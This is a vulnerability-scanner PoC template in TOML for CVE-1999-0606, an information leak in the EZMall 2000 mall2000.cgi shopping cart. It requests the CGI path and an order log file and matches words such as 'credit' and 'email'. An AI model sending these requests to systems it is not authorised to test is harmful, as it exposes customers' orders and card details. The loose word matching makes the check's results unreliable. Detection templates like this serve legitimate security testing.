[info]
author = "ave"
description = "EZMall 2000 购物车 CGI 程序 mall2000.cgi 因错误配置可能泄露敏感私有信息（如客户订单、日志）。通过直接请求该 CGI 路径及其常见日志文件（mall_log_files/order.log），观察响应是否包含私有数据来验证漏洞。"
id = "POC-AVE-1999-0177"
name = "CVE-1999-0606 EZMall 2000 mall2000.cgi 信息泄露 PoC"
severity = "medium"
tags = ["ave-1999-0177"]
vuln_id = [
    "CVE-1999-0606",
    "AVE-1999-0177",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/mall2000.cgi"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "order",
    "credit",
    "email",
    "name",
    "address",
    "phone",
]

[[poc.requests]]
method = "GET"
path = "/cgi-bin/mall_log_files/order.log"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "order",
    "credit",
    "email",
    "name",
    "address",
    "phone",
]
